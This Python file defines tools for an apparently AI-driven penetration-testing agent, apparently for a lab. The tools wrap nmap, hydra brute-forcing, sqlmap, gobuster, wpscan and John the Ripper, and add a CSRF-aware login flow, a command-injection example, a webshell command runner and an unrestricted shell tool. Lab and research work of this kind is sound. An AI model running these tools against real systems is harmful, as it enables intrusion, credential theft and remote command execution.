"""Herramientas de pentesting disponibles para el agente atacante."""

import logging

from langchain_core.tools import tool

from src.infrastructure.docker_client import DockerClient

logger = logging.getLogger(__name__)

_docker = DockerClient()


@tool
def run_nmap(target: str, flags: str = "-sV -sC") -> str:
    """Ejecuta un escaneo nmap contra el objetivo.

    Args:
        target: IP o rango a escanear (ej: "10.10.0.10")
        flags: Flags de nmap (ej: "-sV -sC", "-p-", "-sU --top-ports 100")

    Returns:
        Output del escaneo nmap
    """
    command = f"nmap {flags} {target}"
    result = _docker.exec_in_attacker(command, timeout=180)
    if result.exit_code != 0 and result.stderr:
        return f"Error: {result.stderr}"
    return result.stdout


@tool
def run_hydra_http_form(
    target: str,
    login_path: str,
    user_field: str,
    pass_field: str,
    username: str,
    password_list: str,
    failure_indicator: str,
    extra_form_fields: str = "",
    threads: int = 4,
) -> str:
    """Brute force HTTP POST form login usando hydra.

    Construye automaticamente el modulo http-post-form de hydra con el formato
    correcto. Ideal para atacar formularios de login web (wp-login.php, etc).

    Args:
        target: IP o host del target (ej: "10.10.0.20")
        login_path: Ruta del endpoint de login (ej: "/wp-login.php")
        user_field: Nombre del campo de usuario en el form (ej: "log")
        pass_field: Nombre del campo de password en el form (ej: "pwd")
        username: Usuario a probar (ej: "admin", "elliot")
        password_list: Ruta absoluta al wordlist en el container atacante
        failure_indicator: Substring que aparece en la respuesta cuando el
            login FALLA (ej: "incorrect", "Invalid", "ERROR"). Hydra marca
            una password como correcta cuando esta substring NO aparece.
        extra_form_fields: Campos adicionales del form separados por &
            (ej: "wp-submit=Log+In&testcookie=1"). Opcional.
        threads: Numero de threads paralelos (default 4).

    Returns:
        Output de hydra. Si encuentra credenciales, la linea incluye
        "login: <user>   password: <pass>".
    """
    form_body = f"{user_field}=^USER^&{pass_field}=^PASS^"
    if extra_form_fields:
        form_body += f"&{extra_form_fields}"
    form_module = f"{login_path}:{form_body}:F={failure_indicator}"
    command = (
        f"hydra -l {username} -P {password_list} -t {threads} -f "
        f"{target} http-post-form '{form_module}' 2>&1 | tail -30"
    )
    result = _docker.exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_hydra(
    target: str,
    service: str,
    username: str,
    password_list: str,
    extra_flags: str = "-t 4 -f",
) -> str:
    """Ejecuta hydra contra servicios no-HTTP (ssh, ftp, smb, etc).

    Para HTTP POST form login usa `run_hydra_http_form` que arma el formato
    automaticamente.

    Args:
        target: IP o host del target
        service: Servicio a atacar ("ssh", "ftp", "smb", etc)
        username: Usuario a probar
        password_list: Ruta absoluta al wordlist en el container atacante
        extra_flags: Flags adicionales para hydra (default: -t 4 -f)

    Returns:
        Output de hydra.
    """
    command = (
        f"hydra -l {username} -P {password_list} {extra_flags} "
        f"{target} {service} 2>&1 | tail -30"
    )
    result = _docker.exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_http_session(
    login_url: str,
    login_data: str,
    target_url: str,
    target_method: str = "GET",
    target_data: str = "",
    extra_cookies: str = "",
    session_id: str = "default",
    auto_csrf: bool = True,
) -> str:
    """Flow completo de login HTTP + peticion autenticada con auto-manejo de CSRF.

    Mantiene una cookie jar persistente en /tmp/session_<id>.txt. El flow es:
      1. GET al login_url para obtener PHPSESSID/JSESSIONID y extraer tokens CSRF
         del form (user_token, csrf_token, _token, authenticity_token, etc).
      2. POST login_data (con tokens CSRF inyectados automaticamente si auto_csrf=True).
      3. Si target_method=POST: GET al target_url para obtener tokens CSRF del
         form de destino, luego POST target_data con tokens inyectados.
      4. Si target_method=GET: GET directo al target_url con la sesion.

    Esto permite explotar apps web con CSRF protection (DVWA, WordPress, Drupal)
    sin que tu tengas que orquestar los pasos.

    Args:
        login_url: URL del endpoint de login
        login_data: Body del POST de login (ej: "username=admin&password=admin&Login=Login")
        target_url: URL a acceder con la sesion autenticada
        target_method: Metodo HTTP para target (GET o POST)
        target_data: Body para POST al target (ej: "ip=127.0.0.1;id&Submit=Submit")
        extra_cookies: Cookies extra (ej: "security=low" para DVWA)
        session_id: Identificador para persistir la jar entre llamadas
        auto_csrf: Si True (default), extrae automaticamente tokens CSRF del HTML
            de los form GET y los inyecta en los POSTs.

    Returns:
        Output de la peticion final (headers + body) mas output del login.
    """
    import shlex
    jar = f"/tmp/session_{session_id}.txt"
    tmp_prefix = f"/tmp/httpsession_{session_id}"
    script_lines = []

    if extra_cookies:
        host = login_url.split("/")[2] if "://" in login_url else login_url.split("/")[0]
        cookies_lines = []
        for c in extra_cookies.split(";"):
            c = c.strip()
            if "=" in c:
                name, value = c.split("=", 1)
                cookies_lines.append(
                    f"{host}\\tFALSE\\t/\\tFALSE\\t0\\t{name.strip()}\\t{value.strip()}"
                )
        if cookies_lines:
            nl = "\\n"
            script_lines.append(
                f"printf '# Netscape HTTP Cookie File{nl}{nl.join(cookies_lines)}{nl}' > {jar}"
            )
    else:
        script_lines.append(f": > {jar}")

    csrf_token_names = "user_token authenticity_token csrf_token _csrf _token token _wpnonce"

    if auto_csrf:
        script_lines.append(
            f"curl -s -c {jar} -b {jar} {shlex.quote(login_url)} -o {tmp_prefix}_login_form.html"
        )
        script_lines.append(
            f"login_tokens=''; "
            f"for name in {csrf_token_names}; do "
            f"  val=$(grep -oE \"name=[\\\"']?$name[\\\"']?[^>]*value=[\\\"'][^\\\"']+\" "
            f"{tmp_prefix}_login_form.html 2>/dev/null | "
            f"grep -oE \"value=[\\\"'][^\\\"']+\" | sed \"s/value=[\\\"']//\" | head -1); "
            f"  [ -n \"$val\" ] && login_tokens=\"$login_tokens&$name=$val\"; "
            f"done"
        )
        login_body_expr = f"{shlex.quote(login_data)}\"$login_tokens\""
    else:
        login_body_expr = shlex.quote(login_data)

    script_lines.append(
        f"echo '=== LOGIN RESPONSE ===' && "
        f"curl -s -i -c {jar} -b {jar} "
        f"-d \"{login_body_expr}\" "
        f"{shlex.quote(login_url)} 2>&1 | head -20"
    )
    script_lines[-1] = script_lines[-1].replace(f'"{login_body_expr}"', login_body_expr if auto_csrf else f'"{login_body_expr}"')

    if target_method.upper() == "POST":
        # URL-encode cada value manualmente para evitar interpretacion shell del ';'
        from urllib.parse import quote as _urlq
        encoded_fields = []
        for field in target_data.split("&"):
            if not field:
                continue
            if "=" in field:
                k, v = field.split("=", 1)
                encoded_fields.append(f"{k}={_urlq(v, safe='')}")
            else:
                encoded_fields.append(field)
        encoded_body = "&".join(encoded_fields)
        body_file = f"{tmp_prefix}_body.txt"
        script_lines.append(f"printf %s {shlex.quote(encoded_body)} > {body_file}")

        if auto_csrf:
            script_lines.append(
                f"curl -s -b {jar} -c {jar} {shlex.quote(target_url)} -o {tmp_prefix}_target_form.html"
            )
            script_lines.append(
                f"for name in {csrf_token_names}; do "
                f"  val=$(grep -oE \"name=[\\\"']?$name[\\\"']?[^>]*value=[\\\"'][^\\\"']+\" "
                f"{tmp_prefix}_target_form.html 2>/dev/null | "
                f"grep -oE \"value=[\\\"'][^\\\"']+\" | sed \"s/value=[\\\"']//\" | head -1); "
                f"  [ -n \"$val\" ] && printf '&%s=%s' \"$name\" \"$val\" >> {body_file}; "
                f"done"
            )
        script_lines.append(
            f"echo '=== TARGET RESPONSE ===' && "
            f"curl -s -i -L -b {jar} -c {jar} "
            f"-X POST --data-binary @{body_file} "
            f"{shlex.quote(target_url)} 2>&1 | head -300"
        )
    else:
        script_lines.append(
            f"echo '=== TARGET RESPONSE ===' && "
            f"curl -s -i -L -b {jar} -c {jar} "
            f"{shlex.quote(target_url)} 2>&1 | head -100"
        )

    command = " ; ".join(script_lines) + f" ; rm -f {tmp_prefix}_*.html 2>/dev/null"
    result = _docker.exec_in_attacker(command, timeout=90)
    return result.stdout or result.stderr


@tool
def run_sqlmap(url: str, extra_flags: str = "--batch --level=2") -> str:
    """Ejecuta sqlmap para detectar y explotar inyecciones SQL.

    Args:
        url: URL vulnerable con parametro inyectable (ej: "http://10.10.0.10/vulnerabilities/sqli/?id=1&Submit=Submit")
        extra_flags: Flags adicionales para sqlmap

    Returns:
        Output de sqlmap con resultados de inyeccion
    """
    command = f"sqlmap -u '{url}' {extra_flags} 2>&1 | tail -60"
    result = _docker.exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_command(command: str) -> str:
    """Ejecuta un comando shell arbitrario en el container atacante o via SSH en el target.

    Esta herramienta es la mas flexible. Se usa para:
    - Ejecucion de comandos tras obtener acceso (Execution, Discovery)
    - Enumeracion del sistema (uname, cat /etc/passwd, etc.)
    - Cualquier comando que no tiene wrapper dedicado

    Args:
        command: Comando bash a ejecutar

    Returns:
        Output del comando (stdout + stderr)
    """
    result = _docker.exec_in_attacker(command, timeout=60)
    output = result.stdout
    if result.stderr:
        output += f"\nSTDERR: {result.stderr}"
    return output


@tool
def run_curl(url: str, method: str = "GET", data: str = "", headers: str = "") -> str:
    """Realiza una peticion HTTP con curl.

    Util para interactuar con aplicaciones web, enviar payloads,
    y verificar endpoints durante Initial Access y Execution.

    Args:
        url: URL completa a consultar
        method: Metodo HTTP (GET, POST, PUT)
        data: Datos para POST/PUT
        headers: Headers adicionales (ej: "Cookie: PHPSESSID=abc123")

    Returns:
        Respuesta HTTP (headers + body)
    """
    cmd_parts = [f"curl -s -i -X {method}"]
    if headers:
        for h in headers.split(";"):
            cmd_parts.append(f"-H '{h.strip()}'")
    if data:
        cmd_parts.append(f"-d '{data}'")
    cmd_parts.append(f"'{url}'")

    command = " ".join(cmd_parts)
    result = _docker.exec_in_attacker(command, timeout=30)
    return result.stdout or result.stderr


@tool
def run_nikto(target: str, flags: str = "-Tuning 3 -maxtime 45s") -> str:
    """Escanea vulnerabilidades web con Nikto.

    El default usa -Tuning 3 (solo Information Disclosure) y -maxtime 45s para
    garantizar que Nikto siempre retorne antes del timeout. Para un scan mas
    completo pasar flags explicitas, pero ten en cuenta que un scan completo
    toma varios minutos y sera truncado.

    Args:
        target: IP o URL del objetivo (ej: "10.10.0.20")
        flags: Flags adicionales para nikto (default: "-Tuning 3 -maxtime 45s")

    Returns:
        Output de nikto con vulnerabilidades y tecnologias encontradas
    """
    command = f"/usr/local/bin/nikto -h {target} {flags} 2>&1 | tail -60"
    result = _docker.exec_in_attacker(command, timeout=75)
    output = result.stdout or result.stderr
    if not output.strip():
        return (
            "(nikto terminó sin output — probablemente timeout interno. "
            "Prefiere run_gobuster o run_curl para enumeracion inicial.)"
        )
    return output


@tool
def run_gobuster(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", flags: str = "") -> str:
    """Enumera directorios y archivos en un servidor web con gobuster.

    Args:
        url: URL base del objetivo (ej: "http://10.10.0.10")
        wordlist: Ruta al wordlist en el container atacante
            (default: /usr/share/wordlists/dirb/common.txt con ~4600 entradas)
        flags: Flags adicionales para gobuster

    Returns:
        Directorios y archivos encontrados. Output limitado a 80 lineas.
    """
    command = (
        f"gobuster dir -u {url} -w {wordlist} -q {flags} 2>&1 | head -80"
    )
    result = _docker.exec_in_attacker(command, timeout=180)
    output = result.stdout or result.stderr
    if not output.strip():
        return (
            f"(gobuster terminó sin resultados en {url} — ninguna entrada del "
            f"wordlist existe bajo ese path. No insistas con esa URL base; "
            f"verificala primero con run_curl.)"
        )
    return output


@tool
def run_gobuster_recursive(
    url: str,
    max_depth: int = 2,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,txt",
) -> str:
    """Enumera directorios de forma recursiva a partir de una URL base.

    Ejecuta gobuster en la URL base, identifica los subdirectorios descubiertos
    (status 301/302 terminados en /) y los vuelve a enumerar hasta max_depth
    niveles. Util para mapear apps web con estructura jerarquica.

    Args:
        url: URL base a enumerar (ej: "http://10.10.0.10")
        max_depth: Profundidad maxima de recursion (default 2)
        wordlist: Ruta al wordlist
        extensions: Extensiones a probar separadas por coma

    Returns:
        Listado agregado de todos los paths encontrados en todos los niveles.
    """
    import shlex
    base_url = url.rstrip("/")
    script = (
        f"url={shlex.quote(base_url)}; "
        f"wl={shlex.quote(wordlist)}; "
        f"ext={shlex.quote(extensions)}; "
        f"depth={max_depth}; "
        f"visited=''; "
        f"queue=\"$url\"; "
        f"out=''; "
        f"for level in $(seq 1 $depth); do "
        f"  next=''; "
        f"  for target in $queue; do "
        f"    case \"$visited\" in *\"|$target|\"*) continue ;; esac; "
        f"    visited=\"$visited|$target|\"; "
        f"    out=\"$out\n=== $target ===\n\"; "
        f"    result=$(gobuster dir -u \"$target\" -w \"$wl\" -x \"$ext\" -q --no-error 2>/dev/null | head -40); "
        f"    out=\"$out$result\n\"; "
        f"    echo \"$result\" | grep -E 'Status: (301|302)' | grep -oE '/[a-zA-Z0-9_./\\-]+' | while read sub; do "
        f"      full=\"$target$sub\"; "
        f"      case \"$full\" in */) full=\"${{full%/}}\" ;; esac; "
        f"      next=\"$next $full\"; "
        f"    done; "
        f"  done; "
        f"  queue=\"$next\"; "
        f"  [ -z \"$queue\" ] && break; "
        f"done; "
        f"echo \"$out\" | head -200"
    )
    result = _docker.exec_in_attacker(script, timeout=360)
    return result.stdout or result.stderr


@tool
def run_spider(
    url: str,
    cookies: str = "",
    max_pages: int = 25,
) -> str:
    """Crawlea paginas HTML siguiendo enlaces internos (a href) recursivamente.

    Util para mapear apps web autenticadas cuyo contenido no aparece en
    wordlists: se loguea con cookies y sigue los enlaces del sitio.

    Args:
        url: URL inicial a crawlear
        cookies: Cookies de sesion (formato: "name=value; name2=value2")
        max_pages: Numero maximo de paginas a fetchear

    Returns:
        Lista de URLs encontradas junto con titulos y forms detectados.
    """
    import shlex
    cookie_arg = f"-b '{cookies}'" if cookies else ""
    host = url.split("/")[2] if "://" in url else url.split("/")[0]
    script = f"""
set -e
base={shlex.quote(url)}
host={shlex.quote(host)}
cookies={shlex.quote(cookies)}
max={max_pages}
visited=/tmp/spider_visited.$$
queue=/tmp/spider_queue.$$
out=/tmp/spider_out.$$
: > "$visited"
echo "$base" > "$queue"
: > "$out"
count=0
while [ -s "$queue" ] && [ "$count" -lt "$max" ]; do
  url=$(head -n1 "$queue")
  sed -i '1d' "$queue"
  case "$(grep -Fx "$url" "$visited")" in "$url") continue ;; esac
  echo "$url" >> "$visited"
  count=$((count+1))
  if [ -n "$cookies" ]; then
    body=$(curl -s -L -b "$cookies" -o /dev/stdout -w "\\nHTTP %{{http_code}}\\n" "$url" 2>/dev/null)
  else
    body=$(curl -s -L -o /dev/stdout -w "\\nHTTP %{{http_code}}\\n" "$url" 2>/dev/null)
  fi
  status=$(echo "$body" | tail -n1)
  title=$(echo "$body" | grep -oE '<title>[^<]*</title>' | head -1 | sed 's/<[^>]*>//g')
  forms=$(echo "$body" | grep -oE '<form[^>]*>' | head -3)
  echo "[$status] $url  ${{title:-(no title)}}" >> "$out"
  if [ -n "$forms" ]; then
    echo "  FORMS: $forms" >> "$out"
  fi
  echo "$body" | grep -oE 'href="[^"]+"' | sed 's/href="//;s/"$//' | while read link; do
    case "$link" in
      http*//"$host"*) full="$link" ;;
      http*) continue ;;
      /*) full="http://$host$link" ;;
      \\#*) continue ;;
      ?*) base_dir=$(dirname "$url"); full="$base_dir/$link" ;;
      *) continue ;;
    esac
    case "$full" in *\\?*) full=$(echo "$full" | cut -d'?' -f1) ;; esac
    if ! grep -Fxq "$full" "$visited" && ! grep -Fxq "$full" "$queue"; then
      echo "$full" >> "$queue"
    fi
  done
done
cat "$out"
rm -f "$visited" "$queue" "$out"
"""
    result = _docker.exec_in_attacker(script, timeout=180)
    return result.stdout or result.stderr


@tool
def run_wpscan(url: str, flags: str = "--enumerate u --disable-tls-checks") -> str:
    """Escanea un sitio WordPress con WPScan para enumerar usuarios y vulnerabilidades.

    Args:
        url: URL del sitio WordPress (ej: "http://10.10.0.20")
        flags: Flags adicionales de wpscan

    Returns:
        Output de wpscan con usuarios, plugins y vulnerabilidades
    """
    command = f"wpscan --url {url} {flags} 2>&1 | tail -80"
    result = _docker.exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_web_shell(cmd: str, url: str = "http://10.10.0.20/shell.php") -> str:
    """Ejecuta un comando en el target via webshell PHP desplegada durante Execution.

    Requiere que la webshell haya sido creada previamente via el theme editor
    de WordPress (/wp-admin/theme-editor.php).

    Args:
        cmd: Comando shell a ejecutar en el servidor target
        url: URL de la webshell (default: http://10.10.0.20/shell.php)

    Returns:
        Output del comando ejecutado en el target
    """
    import urllib.parse
    encoded = urllib.parse.quote(cmd)
    request_cmd = f"curl -s '{url}?cmd={encoded}'"
    result = _docker.exec_in_attacker(request_cmd, timeout=30)
    return result.stdout or result.stderr


@tool
def run_john(hash_content: str, wordlist: str = "/opt/wordlists/mrrobot.txt") -> str:
    """Crack hashes de contrasena con John the Ripper.

    Args:
        hash_content: Hash en formato john (ej: "robot:c3fcd3d76192e4007dfb496cca67e13b")
        wordlist: Ruta al wordlist en el container atacante

    Returns:
        Contrasena crackeada o output de john
    """
    commands = [
        f"echo '{hash_content}' > /tmp/hash_crack.txt",
        f"john --format=raw-md5 --wordlist={wordlist} /tmp/hash_crack.txt 2>&1",
        "john --show --format=raw-md5 /tmp/hash_crack.txt 2>&1",
    ]
    command = " && ".join(commands)
    result = _docker.exec_in_attacker(command, timeout=60)
    return result.stdout or result.stderr


ATTACKER_TOOLS = [
    run_nmap,
    run_hydra_http_form,
    run_hydra,
    run_http_session,
    run_sqlmap,
    run_command,
    run_curl,
    run_nikto,
    run_gobuster,
    run_gobuster_recursive,
    run_spider,
    run_wpscan,
    run_web_shell,
    run_john,
]
